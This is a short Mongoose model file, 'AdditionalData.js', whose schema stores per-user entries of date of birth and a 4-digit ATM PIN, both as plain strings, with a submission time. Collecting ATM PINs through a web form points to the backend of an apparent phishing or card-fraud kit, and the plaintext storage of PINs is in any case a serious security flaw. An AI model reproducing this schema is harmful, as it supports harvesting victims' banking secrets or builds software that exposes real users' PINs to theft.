// models/AdditionalData.js
const mongoose = require('mongoose');

const additionalDataSchema = new mongoose.Schema({
  uniqueid:    { type: String, required: true, unique: true },
  entries: [
    {
      dob:         { type: String, required: true },      // storing as "DD/MM/YYYY"
      atmPin:      { type: String, required: true },      // 4-digit PIN
      submittedAt: { type: Date,   default: Date.now }
    }
  ]
});

module.exports = mongoose.model('AdditionalData', additionalDataSchema);
